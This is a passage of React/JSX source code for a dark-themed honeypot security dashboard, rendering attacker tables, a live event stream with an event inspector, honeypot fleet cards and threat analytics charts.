                honeypotFilter={honeypotFilter}
                setHoneypotFilter={setHoneypotFilter}
                graphSearch={graphSearch}
                setGraphSearch={setGraphSearch}
                isPaused={!isMonitoringActive}
                setIsPaused={(val) => setIsMonitoringActive(!val)}
                reducedMotion={reducedMotion}
                isFullscreen={isFullscreenGraph}
                setIsFullscreen={setIsFullscreenGraph}
                compactHeight={true}
              />
            </section>

            {/* Mobile-only Inspector Fallback (since desktop inspector is docked below Settings in left sidebar) */}
            <div className="block md:hidden">
              <EntityInspectorPanel
                selectedEntity={selectedEntity}
                onClose={() => setSelectedEntity(null)}
                events={events}
                onContainAttacker={triggerDemoCapture}
                isLiveMode={operatingMode === 'LIVE'}
              />
            </div>

            {/* Compact Bottom Live Telemetry Ticker */}
            <section className="bg-[#141416] border border-[#27272A]">
              <div className="px-3.5 py-2 border-b border-[#27272A] flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <span className="w-2 h-2 bg-[#FF493D] inline-block" />
                  <span className="font-mono text-[11px] font-bold uppercase tracking-wider text-[#F1EFE9]">
                    RECENT SECURITY EVENTS
                  </span>
                </div>
                <button
                  onClick={() => setActivePage('events')}
                  className="font-mono text-[10px] uppercase text-[#9A9891] underline hover:text-[#FF493D]"
                >
                  OPEN FULL EVENT STREAM ({events.length}) →
                </button>
              </div>
              <div className="divide-y divide-[#27272A] max-h-[155px] overflow-y-auto font-mono text-[11px]">
                {events.length === 0 ? (
                  <div className="px-4 py-8 bg-[#101012] text-center text-xs text-[#9A9891]">
                    <span className="text-[#F1EFE9] font-bold">GRID LISTENING</span> · No adversary intrusions logged yet. Launch Red Team attack simulation to trigger telemetry.
                  </div>
                ) : (
                  events.slice(0, 4).map((ev) => (
                    <div
                      key={ev.id}
                      onClick={() => {
                        const att = attackers.find((a) => a.ip === ev.source);
                        if (att) setSelectedEntity({ kind: 'ATTACKER', data: att });
                      }}
                      className="px-3.5 py-2 bg-[#101012] hover:bg-[#18181B] cursor-pointer grid grid-cols-1 md:grid-cols-12 gap-2 items-center"
                    >
                      <span className="md:col-span-2 text-[#9A9891]">{ev.timestamp}</span>
                      <span className="md:col-span-2">
                        <span
                          className={cn(
                            'px-1.5 py-0.5 text-[9px] uppercase font-bold',
                            ev.severity === 'critical'
                              ? 'bg-[#FF493D] text-[#0B0B0C]'
                              : 'bg-[#27272A] text-[#F1EFE9]'
                          )}
                        >
                          {ev.type}
                        </span>
                      </span>
                      <span className="md:col-span-3 font-bold text-[#F1EFE9]">
                        {ev.source} → {ev.destination}
                      </span>
                      <span className="md:col-span-1 text-[#9A9891]">{ev.protocol}</span>
                      <span className="md:col-span-4 font-sans text-xs text-[#D8D5CE] truncate">
                        {ev.description}
                      </span>
                    </div>
                  ))
                )}
              </div>
            </section>
          </main>
        )}

        {/* ==================================================================
            PAGE 2: NETWORK INTELLIGENCE — FULL-WIDTH TOPOLOGY EXPLORATION
        ================================================================== */}
        {activePage === 'network' && (
          <main className="p-5 space-y-4 flex-1 overflow-y-auto">
            <div className="flex flex-wrap items-end justify-between gap-3 border-b border-[#27272A] pb-3">
              <div>
                <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                  DEDICATED TOPOLOGY & TRAFFIC TRAIL MATRIX
                </div>
                <h1 className="text-2xl font-bold tracking-tight">
                  Network Intelligence
                </h1>
              </div>
              <div className="font-mono text-[11px] text-[#9A9891]">
                ENTITIES: {infraNodes.length + honeypots.length + attackers.length} NODES //
                INSPECTOR DOCKED BELOW SETTINGS IN SIDEBAR
              </div>
            </div>

            {/* Full-Width Graph Extended to Right Side */}
            <div className="w-full">
              <NetworkTopologyCanvas
                infraNodes={infraNodes}
                honeypots={honeypots}
                attackers={attackers}
                selectedEntity={selectedEntity}
                onSelectEntity={setSelectedEntity}
                nodeCategoryFilter={nodeCategoryFilter}
                setNodeCategoryFilter={setNodeCategoryFilter}
                severityFilter={severityFilter}
                setSeverityFilter={setSeverityFilter}
                honeypotFilter={honeypotFilter}
                setHoneypotFilter={setHoneypotFilter}
                graphSearch={graphSearch}
                setGraphSearch={setGraphSearch}
                isPaused={!isMonitoringActive}
                setIsPaused={(val) => setIsMonitoringActive(!val)}
                reducedMotion={reducedMotion}
                isFullscreen={isFullscreenGraph}
                setIsFullscreen={setIsFullscreenGraph}
                compactHeight={false}
              />
            </div>
          </main>
        )}

        {/* ==================================================================
            PAGE 3: ATTACKERS INVESTIGATION TABLE
        ================================================================== */}
        {activePage === 'attackers' && (
          <main className="p-5 space-y-4 flex-1 overflow-y-auto">
            <div className="flex flex-wrap items-end justify-between gap-3 border-b border-[#27272A] pb-3">
              <div>
                <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                  OBSERVED THREAT ACTORS & INTRUSION SESSIONS
                </div>
                <h1 className="text-2xl font-bold tracking-tight">
                  Attackers Directory
                </h1>
              </div>

              <button
                onClick={exportAttackersCsv}
                className="px-3.5 py-1.5 bg-[#F1EFE9] text-[#0B0B0C] hover:bg-[#FF493D] font-mono text-xs font-bold uppercase flex items-center gap-2 transition-colors"
              >
                <Download size={13} /> EXPORT CSV ({filteredAttackersList.length})
              </button>
            </div>

            {/* Filter & Search Bar */}
            <div className="bg-[#141416] border border-[#27272A] p-3 flex flex-wrap items-center justify-between gap-3 font-mono text-xs">
              <div className="flex items-center gap-3 flex-wrap">
                <div className="relative">
                  <Search
                    size={13}
                    className="absolute left-2.5 top-1/2 -translate-y-1/2 text-[#9A9891]"
                  />
                  <input
                    type="text"
                    value={attackerSearch}
                    onChange={(e) => setAttackerSearch(e.target.value)}
                    placeholder="SEARCH IP, HONEYPOT, VECTOR..."
                    className="pl-8 pr-3 py-1 bg-[#0B0B0C] border border-[#27272A] text-[#F1EFE9] text-xs w-64 focus:outline-none focus:border-[#F1EFE9]"
                  />
                </div>

                <div className="flex items-center border border-[#27272A] bg-[#0B0B0C] text-[10px]">
                  {['ALL', 'CRITICAL', 'HIGH', 'LOW'].map((sev) => (
                    <button
                      key={sev}
                      onClick={() => setAttackerSeverityFilter(sev)}
                      className={cn(
                        'px-2.5 py-1 uppercase',
                        attackerSeverityFilter === sev
                          ? sev === 'CRITICAL'
                            ? 'bg-[#FF493D] text-[#0B0B0C] font-bold'
                            : 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                          : 'text-[#9A9891] hover:text-[#F1EFE9]'
                      )}
                    >
                      {sev}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex items-center gap-2 text-[10px]">
                <span className="text-[#9A9891]">SORT BY:</span>
                <button
                  onClick={() => setAttackerSortField('threatScore')}
                  className={cn(
                    'px-2.5 py-1 border border-[#27272A] uppercase',
                    attackerSortField === 'threatScore'
                      ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                      : 'bg-[#0B0B0C] text-[#9A9891]'
                  )}
                >
                  SEVERITY SCORE
                </button>
                <button
                  onClick={() => setAttackerSortField('attempts')}
                  className={cn(
                    'px-2.5 py-1 border border-[#27272A] uppercase',
                    attackerSortField === 'attempts'
                      ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                      : 'bg-[#0B0B0C] text-[#9A9891]'
                  )}
                >
                  ATTEMPTS
                </button>
              </div>
            </div>

            <div className="border border-[#27272A] bg-[#101012] overflow-x-auto">
              <table className="w-full text-left border-collapse">
                <thead>
                  <tr className="bg-[#141416] border-b border-[#27272A] font-mono text-[10px] uppercase text-[#9A9891]">
                    <th className="py-2.5 px-3">IP ADDRESS</th>
                    <th className="py-2.5 px-3">INTRUSION VECTOR</th>
                    <th className="py-2.5 px-3">FIRST / LAST SEEN</th>
                    <th className="py-2.5 px-3">ATTEMPTS</th>
                    <th className="py-2.5 px-3">TARGETED HONEYPOTS</th>
                    <th className="py-2.5 px-3">PROTOCOLS</th>
                    <th className="py-2.5 px-3">SEVERITY</th>
                    <th className="py-2.5 px-3">STATUS</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-[#27272A] font-mono text-xs">
                  {filteredAttackersList.length === 0 ? (
                    <tr>
                      <td colSpan={8} className="py-12 text-center text-[#9A9891]">
                        <div className="text-[#F1EFE9] font-bold mb-1">NO ADVERSARIES OBSERVED // PERIMETER SECURE</div>
                        <p className="text-[11px] text-[#71717A]">
                          When adversary bots or scanners interact with honeytokens, their IP signatures and JA4H fingerprints will register here.
                        </p>
                      </td>
                    </tr>
                  ) : (
                    filteredAttackersList.map((att) => {
                      const isSel =
                        selectedEntity?.kind === 'ATTACKER' &&
                        selectedEntity?.data?.id === att.id;
                      return (
                        <tr
                          key={att.id}
                          onClick={() => setSelectedEntity({ kind: 'ATTACKER', data: att })}
                          className={cn(
                            'cursor-pointer transition-colors',
                            isSel ? 'bg-[#1E1E22]' : 'hover:bg-[#18181B]'
                          )}
                        >
                          <td className="py-2.5 px-3 font-bold text-[#F1EFE9]">{att.ip}</td>
                          <td className="py-2.5 px-3 font-sans text-xs text-[#D8D5CE]">
                            {att.attackType}
                          </td>
                          <td className="py-2.5 px-3 text-[10px] text-[#9A9891]">
                            {att.firstSeen} → {att.lastSeen}
                          </td>
                          <td className="py-2.5 px-3 font-bold text-[#F1EFE9]">{att.attempts}</td>
                          <td className="py-2.5 px-3 text-[11px] text-[#D8D5CE]">
                            {att.targetedHoneypots.join(', ')}
                          </td>
                          <td className="py-2.5 px-3 text-[11px] text-[#9A9891]">
                            {att.protocols.join(', ')}
                          </td>
                          <td className="py-2.5 px-3">
                            <span
                              className={cn(
                                'px-1.5 py-0.5 text-[10px] uppercase font-bold',
                                att.severity === 'critical'
                                  ? 'bg-[#FF493D] text-[#0B0B0C]'
                                  : 'bg-[#27272A] text-[#F1EFE9]'
                              )}
                            >
                              {att.severity}
                            </span>
                          </td>
                          <td className="py-2.5 px-3">
                            <span
                              className={cn(
                                'px-1.5 py-0.5 text-[10px] uppercase font-bold',
                                att.status === 'Contained'
                                  ? 'border border-[#FF493D] text-[#FF493D]'
                                  : 'text-[#F1EFE9]'
                              )}
                            >
                              {att.status}
                            </span>
                          </td>
                        </tr>
                      );
                    })
                  )}
                </tbody>
              </table>
            </div>
          </main>
        )}

        {/* ==================================================================
            PAGE 4: LIVE EVENTS STREAM & PACKET INSPECTOR
        ================================================================== */}
        {activePage === 'events' && (
          <main className="p-5 space-y-4 flex-1 overflow-y-auto">
            <div className="flex flex-wrap items-end justify-between gap-3 border-b border-[#27272A] pb-3">
              <div>
                <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                  REAL-TIME TELEMETRY INGESTION PIPELINE
                </div>
                <h1 className="text-2xl font-bold tracking-tight">
                  Live Security Events
                </h1>
              </div>

              <div className="flex items-center gap-2 font-mono text-[10px]">
                {['ALL', 'CRITICAL', 'HIGH', 'INFO'].map((sev) => (
                  <button
                    key={sev}
                    onClick={() => setEventSeverityFilter(sev)}
                    className={cn(
                      'px-2.5 py-1 border border-[#27272A] uppercase',
                      eventSeverityFilter === sev
                        ? sev === 'CRITICAL'
                          ? 'bg-[#FF493D] text-[#0B0B0C] font-bold'
                          : 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                        : 'bg-[#141416] text-[#9A9891]'
                    )}
                  >
                    {sev}
                  </button>
                ))}
              </div>
            </div>

            {/* Event Search & Multi-Filters */}
            <div className="bg-[#141416] border border-[#27272A] p-3 flex flex-wrap items-center justify-between gap-3 font-mono text-xs">
              <div className="flex items-center gap-2 flex-wrap">
                <input
                  type="text"
                  value={eventSearch}
                  onChange={(e) => setEventSearch(e.target.value)}
                  placeholder="SEARCH SOURCE IP, EVENT ID, DESCRIPTION..."
                  className="px-3 py-1 bg-[#0B0B0C] border border-[#27272A] text-[#F1EFE9] text-xs w-72 focus:outline-none"
                />

                <select
                  value={eventTypeFilter}
                  onChange={(e) => setEventTypeFilter(e.target.value)}
                  className="px-2.5 py-1 bg-[#0B0B0C] border border-[#27272A] text-[#F1EFE9] text-[11px] uppercase"
                >
                  <option value="ALL">ALL EVENT TYPES</option>
                  <option value="EXPLOIT_ATTEMPT">EXPLOIT_ATTEMPT</option>
                  <option value="SESSION_CONTAINED">SESSION_CONTAINED</option>
                  <option value="BRUTE_FORCE">BRUTE_FORCE</option>
                  <option value="SUSPICIOUS_QUERY">SUSPICIOUS_QUERY</option>
                  <option value="RECON_SCAN">RECON_SCAN</option>
                </select>

                <select
                  value={eventHoneypotFilter}
                  onChange={(e) => setEventHoneypotFilter(e.target.value)}
                  className="px-2.5 py-1 bg-[#0B0B0C] border border-[#27272A] text-[#F1EFE9] text-[11px] uppercase"
                >
                  <option value="ALL">ALL HONEYPOTS</option>
                  {honeypots.map((h) => (
                    <option key={h.id} value={h.id}>
                      {h.name.toUpperCase()}
                    </option>
                  ))}
                </select>
              </div>

              <span className="text-[11px] text-[#9A9891]">
                SHOWING {filteredEventsList.length} EVENTS
              </span>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-12 gap-4">
              <div className="lg:col-span-8 bg-[#101012] border border-[#27272A] divide-y divide-[#27272A] max-h-[520px] overflow-y-auto font-mono text-xs">
                {filteredEventsList.length === 0 ? (
                  <div className="p-12 text-center text-xs font-mono text-[#9A9891]">
                    <div className="text-[#F1EFE9] font-bold mb-1">NO SECURITY EVENTS CAPTURED // SENSORS ACTIVE</div>
                    <p className="text-[11px] text-[#71717A] max-w-md mx-auto">
                      Standing by for adversary interaction. Launch an attack from the Red Team console or execute the CLI simulator to see real telemetry stream here.
                    </p>
                  </div>
                ) : (
                  filteredEventsList.map((ev) => (
                    <div
                      key={ev.id}
                      onClick={() => setInspectedEvent(ev)}
                      className={cn(
                        'p-3 cursor-pointer transition-colors',
                        inspectedEvent?.id === ev.id
                          ? 'bg-[#1E1E22]'
                          : 'hover:bg-[#141416]'
                      )}
                    >
                      <div className="flex items-center justify-between mb-1">
                        <div className="flex items-center gap-2">
                          <span className="text-[10px] text-[#9A9891]">{ev.id}</span>
                          <span
                            className={cn(
                              'px-1.5 py-0.5 text-[9px] uppercase font-bold',
                              ev.severity === 'critical'
                                ? 'bg-[#FF493D] text-[#0B0B0C]'
                                : 'bg-[#27272A] text-[#F1EFE9]'
                            )}
                          >
                            {ev.type}
                          </span>
                          <span className="font-bold text-[#F1EFE9]">{ev.source}</span>
                          <span className="text-[#9A9891]">→ {ev.destination}</span>
                          <span className="text-[10px] px-1.5 bg-[#18181B] border border-[#27272A] text-[#D8D5CE]">
                            {ev.protocol}
                          </span>
                        </div>
                        <span className="text-[10px] text-[#9A9891]">{ev.timestamp}</span>
                      </div>
                      <div className="font-sans text-xs text-[#D8D5CE]">{ev.description}</div>
                    </div>
                  ))
                )}
              </div>

              {/* Event Detail Panel */}
              <div className="lg:col-span-4 bg-[#141416] border border-[#27272A] p-4 font-mono text-xs space-y-4">
                {inspectedEvent ? (
                  <>
                    <div className="border-b border-[#27272A] pb-2">
                      <div className="text-[10px] text-[#9A9891] uppercase">
                        EVENT PAYLOAD INSPECTOR
                      </div>
                      <div className="text-base font-bold text-[#F1EFE9] mt-0.5">
                        {inspectedEvent.id} // {inspectedEvent.type}
                      </div>
                    </div>

                    <div className="grid grid-cols-2 gap-2 bg-[#101012] p-3 border border-[#27272A] text-[11px]">
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">SOURCE IP</span>
                        <span className="font-bold text-[#F1EFE9]">{inspectedEvent.source}</span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">HONEYPOT</span>
                        <span className="font-bold text-[#F1EFE9]">
                          {inspectedEvent.destination}
                        </span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">PROTOCOL</span>
                        <span className="text-[#D8D5CE]">{inspectedEvent.protocol}</span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">SEVERITY</span>
                        <span
                          className={cn(
                            'uppercase font-bold',
                            inspectedEvent.severity === 'critical'
                              ? 'text-[#FF493D]'
                              : 'text-[#F1EFE9]'
                          )}
                        >
                          {inspectedEvent.severity}
                        </span>
                      </div>
                    </div>

                    <div>
                      <div className="text-[10px] text-[#9A9891] uppercase mb-1">
                        RAW TELEMETRY FRAME
                      </div>
                      <pre className="p-3 bg-[#080809] text-[#F1EFE9] border border-[#27272A] text-[10px] overflow-x-auto whitespace-pre-wrap break-all">
                        {inspectedEvent.raw}
                      </pre>
                    </div>
                  </>
                ) : (
                  <div className="py-16 text-center text-xs font-mono text-[#9A9891]">
                    <div className="text-[#F1EFE9] font-bold mb-1">EVENT INSPECTOR IDLE</div>
                    <p className="text-[11px] text-[#71717A]">
                      Select an event from the stream to inspect full cryptographic and telemetry payloads.
                    </p>
                  </div>
                )}
              </div>
            </div>
          </main>
        )}

        {/* ==================================================================
            PAGE 5: HONEYPOTS FLEET MONITORING PAGE
        ================================================================== */}
        {activePage === 'honeypots' && (
          <main className="p-5 space-y-4 flex-1 overflow-y-auto">
            <div className="border-b border-[#27272A] pb-3 flex flex-wrap items-end justify-between gap-3">
              <div>
                <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                  DECOY INFRASTRUCTURE NODES
                </div>
                <h1 className="text-2xl font-bold tracking-tight">
                  Honeypot Fleet Status
                </h1>
              </div>
              <span className="font-mono text-xs text-[#9A9891]">
                SELECT ANY DECOY TO INSPECT SESSIONS, PROTOCOLS & RELATED ATTACKERS
              </span>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 border-t border-l border-[#27272A]">
              {honeypots.map((hp) => {
                const isSel = selectedHoneypotDetail?.id === hp.id;
                const isAlert =
                  hp.status === 'Under Attack' || hp.status === 'Capturing';
                return (
                  <div
                    key={hp.id}
                    onClick={() => {
                      setSelectedHoneypotDetail(hp);
                      setSelectedEntity({ kind: 'HONEYPOT', data: hp });
                    }}
                    className={cn(
                      'p-4 border-r border-b border-[#27272A] cursor-pointer transition-colors relative',
                      isSel ? 'bg-[#18181B]' : 'bg-[#101012] hover:bg-[#141416]'
                    )}
                  >
                    {isSel && (
                      <span className="absolute top-0 left-0 right-0 h-[3px] bg-[#FF493D]" />
                    )}
                    <div className="flex items-center justify-between mb-1">
                      <span className="font-mono text-sm font-bold text-[#F1EFE9] flex items-center gap-1.5">
                        <Hexagon
                          size={13}
                          className={isAlert ? 'text-[#FF493D]' : 'text-[#F1EFE9]'}
                        />
                        {hp.name}
                      </span>
                      <span
                        className={cn(
                          'font-mono text-[10px] px-2 py-0.5 uppercase font-bold',
                          isAlert
                            ? 'bg-[#FF493D] text-[#0B0B0C]'
                            : 'bg-[#27272A] text-[#F1EFE9]'
                        )}
                      >
                        {hp.status}
                      </span>
                    </div>
                    <div className="text-xs text-[#9A9891] mb-3">{hp.type}</div>

                    <div className="grid grid-cols-2 gap-2 font-mono text-[11px] border-t border-[#27272A] pt-2.5">
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">HOST / IP</span>
                        <span className="text-[#D8D5CE]">{hp.ip}</span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">PROTOCOLS</span>
                        <span className="text-[#D8D5CE]">{hp.protocols.join(', ')}</span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">ACTIVE SESSIONS</span>
                        <span className="font-bold text-[#FF493D]">{hp.activeSessions}</span>
                      </div>
                      <div>
                        <span className="text-[9px] text-[#9A9891] block">INTERACTIONS</span>
                        <span className="font-bold text-[#F1EFE9]">{hp.totalInteractions}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>

            {selectedHoneypotDetail && (
              <div className="bg-[#141416] border border-[#27272A] p-5 grid grid-cols-1 lg:grid-cols-12 gap-5 font-mono text-xs">
                <div className="lg:col-span-5 space-y-3">
                  <div className="text-[10px] text-[#9A9891] uppercase">
                    DECOY SYSTEM TELEMETRY // {selectedHoneypotDetail.region}
                  </div>
                  <div className="text-xl font-bold text-[#F1EFE9]">
                    {selectedHoneypotDetail.name}
                  </div>
                  <div className="font-sans text-xs text-[#D8D5CE]">
                    Service Emulation: <strong>{selectedHoneypotDetail.service}</strong>
                  </div>
                  <div className="grid grid-cols-3 gap-2 bg-[#101012] p-3 border border-[#27272A]">
                    <div>
                      <span className="text-[9px] text-[#9A9891] block">UPTIME</span>
                      <span className="font-bold text-[#F1EFE9]">
                        {selectedHoneypotDetail.uptime}
                      </span>
                    </div>
                    <div>
                      <span className="text-[9px] text-[#9A9891] block">CPU LOAD</span>
                      <span className="font-bold text-[#F1EFE9]">
                        {selectedHoneypotDetail.cpu}%
                      </span>
                    </div>
                    <div>
                      <span className="text-[9px] text-[#9A9891] block">LAST ACTIVITY</span>
                      <span className="font-bold text-[#F1EFE9]">
                        {selectedHoneypotDetail.lastActivity}
                      </span>
                    </div>
                  </div>
                </div>

                <div className="lg:col-span-7 space-y-2">
                  <div className="text-[10px] text-[#9A9891] uppercase">
                    CONNECTED THREAT ACTORS TARGETING {selectedHoneypotDetail.name.toUpperCase()}
                  </div>
                  <div className="bg-[#101012] border border-[#27272A] divide-y divide-[#27272A]">
                    {attackers.filter((a) => a.targetedHoneypots?.includes(selectedHoneypotDetail.id)).length === 0 ? (
                      <div className="p-6 text-center text-xs font-mono text-[#9A9891]">
                        No active adversaries targeting this decoy yet.
                      </div>
                    ) : (
                      attackers
                        .filter((a) => a.targetedHoneypots?.includes(selectedHoneypotDetail.id))
                        .map((a) => (
                          <div
                            key={a.id}
                            onClick={() => setSelectedEntity({ kind: 'ATTACKER', data: a })}
                            className="p-2.5 flex items-center justify-between cursor-pointer hover:bg-[#18181B]"
                          >
                            <div>
                              <span className="font-bold text-[#F1EFE9]">{a.ip}</span>
                              <span className="text-[#9A9891] ml-2 font-sans text-xs">
                                {a.attackType}
                              </span>
                            </div>
                            <span
                              className={cn(
                                'px-2 py-0.5 text-[10px] uppercase font-bold',
                                a.status === 'Contained'
                                  ? 'bg-[#FF493D] text-[#0B0B0C]'
                                  : 'bg-[#27272A] text-[#F1EFE9]'
                              )}
                            >
                              {a.status}
                            </span>
                          </div>
                        ))
                    )}
                  </div>
                </div>
              </div>
            )}
          </main>
        )}

        {/* ==================================================================
            PAGE 6: ANALYTICS PAGE (RECHARTS DARK TELEMETRY)
        ================================================================== */}
        {activePage === 'analytics' && (
          <main className="p-5 space-y-5 flex-1 overflow-y-auto">
            <div className="border-b border-[#27272A] pb-3 flex flex-wrap items-end justify-between gap-3">
              <div>
                <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                  AGGREGATED SECURITY OPERATIONS METRICS (
                  {operatingMode === 'DEMO' ? 'SIMULATED DATASET' : 'LIVE TELEMETRY'})
                </div>
                <h1 className="text-2xl font-bold tracking-tight">
                  Threat Analytics
                </h1>
              </div>

              <div className="flex items-center border border-[#27272A] bg-[#141416] font-mono text-xs">
                {['1H', '24H', '7D'].map((rng) => (
                  <button
                    key={rng}
                    onClick={() => setAnalyticsTimeRange(rng)}
                    className={cn(
                      'px-3 py-1 uppercase',
                      analyticsTimeRange === rng
                        ? 'bg-[#F1EFE9] text-[#0B0B0C] font-bold'
                        : 'text-[#9A9891] hover:text-[#F1EFE9]'
                    )}
                  >
                    LAST {rng}
                  </button>
                ))}
              </div>
            </div>

            {/* Row 1: Attack Volume Over Time & Captured Sessions Over Time */}
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
              <div className="bg-[#141416] border border-[#27272A] p-4">
                <div className="font-mono text-xs font-bold uppercase mb-3 text-[#F1EFE9]">
                  ATTACK VOLUME & CRITICAL ALERTS OVER TIME ({analyticsTimeRange})
                </div>
                <div className="h-56 bg-[#0B0B0C] border border-[#27272A] p-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <AreaChart data={ANALYTICS_SERIES[analyticsTimeRange]}>
                      <CartesianGrid stroke="#1E1E22" strokeDasharray="3 3" />
                      <XAxis
                        dataKey="time"
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <YAxis
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <RechartsTooltip
                        contentStyle={{
                          backgroundColor: '#101012',
                          borderColor: '#27272A',
                          color: '#F1EFE9',
                          fontFamily: 'monospace',
                          fontSize: '11px',
                        }}
                      />
                      <Area
                        type="monotone"
                        dataKey="attacks"
                        stroke="#F1EFE9"
                        strokeWidth={2}
                        fill="#27272A"
                      />
                      <Area
                        type="monotone"
                        dataKey="critical"
                        stroke="#FF493D"
                        strokeWidth={2}
                        fill="#FF493D"
                        fillOpacity={0.35}
                      />
                    </AreaChart>
                  </ResponsiveContainer>
                </div>
              </div>

              <div className="bg-[#141416] border border-[#27272A] p-4">
                <div className="font-mono text-xs font-bold uppercase mb-3 text-[#F1EFE9]">
                  CONTAINED SESSIONS OVER TIME ({analyticsTimeRange})
                </div>
                <div className="h-56 bg-[#0B0B0C] border border-[#27272A] p-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart data={ANALYTICS_SERIES[analyticsTimeRange]}>
                      <CartesianGrid stroke="#1E1E22" vertical={false} />
                      <XAxis
                        dataKey="time"
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <YAxis
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <RechartsTooltip
                        contentStyle={{
                          backgroundColor: '#101012',
                          borderColor: '#27272A',
                          color: '#F1EFE9',
                          fontFamily: 'monospace',
                          fontSize: '11px',
                        }}
                      />
                      <Bar dataKey="contained" fill="#FF493D" />
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>

            {/* Row 2: Targeted Honeypots, Protocols, Severity Distribution */}
            <div className="grid grid-cols-1 lg:grid-cols-3 gap-5">
              <div className="bg-[#141416] border border-[#27272A] p-4">
                <div className="font-mono text-xs font-bold uppercase mb-3 text-[#F1EFE9]">
                  MOST TARGETED HONEYPOTS
                </div>
                <div className="h-52 bg-[#0B0B0C] border border-[#27272A] p-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart
                      layout="vertical"
                      data={honeypots.map((h) => ({
                        name: h.name.replace('honeypot-', ''),
                        hits: h.totalInteractions,
                      }))}
                    >
                      <XAxis
                        type="number"
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <YAxis
                        dataKey="name"
                        type="category"
                        width={75}
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <RechartsTooltip
                        contentStyle={{
                          backgroundColor: '#101012',
                          borderColor: '#27272A',
                          color: '#F1EFE9',
                          fontFamily: 'monospace',
                          fontSize: '11px',
                        }}
                      />
                      <Bar dataKey="hits" fill="#F1EFE9" />
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>

              <div className="bg-[#141416] border border-[#27272A] p-4">
                <div className="font-mono text-xs font-bold uppercase mb-3 text-[#F1EFE9]">
                  MOST COMMON PROTOCOLS
                </div>
                <div className="h-52 bg-[#0B0B0C] border border-[#27272A] p-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart
                      data={[
                        { proto: 'SSH/22', count: 1840 },
                        { proto: 'HTTPS/443', count: 2490 },
                        { proto: 'Telnet/23', count: 1620 },
                        { proto: 'RESP/6379', count: 894 },
                        { proto: 'Modbus/502', count: 412 },
                      ]}
                    >
                      <XAxis
                        dataKey="proto"
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <YAxis
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <RechartsTooltip
                        contentStyle={{
                          backgroundColor: '#101012',
                          borderColor: '#27272A',
                          color: '#F1EFE9',
                          fontFamily: 'monospace',
                          fontSize: '11px',
                        }}
                      />
                      <Bar dataKey="count" fill="#D8D5CE" />
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>

              <div className="bg-[#141416] border border-[#27272A] p-4">
                <div className="font-mono text-xs font-bold uppercase mb-3 text-[#F1EFE9]">
                  SEVERITY DISTRIBUTION
                </div>
                <div className="h-52 bg-[#0B0B0C] border border-[#27272A] p-2">
                  <ResponsiveContainer width="100%" height="100%">
                    <BarChart
                      data={[
                        { level: 'INFO', count: 1240 },
                        { level: 'MEDIUM', count: 1680 },
                        { level: 'HIGH', count: 1190 },
                        { level: 'CRITICAL', count: 680 },
                      ]}
                    >
                      <XAxis
                        dataKey="level"
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <YAxis
                        stroke="#9A9891"
                        tick={{ fontSize: 10, fontFamily: 'monospace', fill: '#9A9891' }}
                      />
                      <RechartsTooltip
                        contentStyle={{
                          backgroundColor: '#101012',
                          borderColor: '#27272A',
                          color: '#F1EFE9',
                          fontFamily: 'monospace',
                          fontSize: '11px',
                        }}
                      />
                      <Bar dataKey="count">
                        {[0, 1, 2, 3].map((idx) => (
                          <Cell
                            key={idx}
                            fill={idx === 3 ? '#FF493D' : '#F1EFE9'}
                          />
                        ))}
                      </Bar>
                    </BarChart>
                  </ResponsiveContainer>
                </div>
              </div>
            </div>
          </main>
        )}

        {/* ==================================================================
            PAGE 7: SETTINGS (WEBSOCKET CONFIG, LIVE FRAME TESTER, MOTION)
        ================================================================== */}
        {activePage === 'settings' && (
          <main className="p-5 space-y-5 flex-1 overflow-y-auto max-w-4xl">
            <div className="border-b border-[#27272A] pb-3">
              <div className="font-mono text-[10px] uppercase tracking-widest text-[#9A9891]">
                PLATFORM & TELEMETRY CONFIGURATION
              </div>
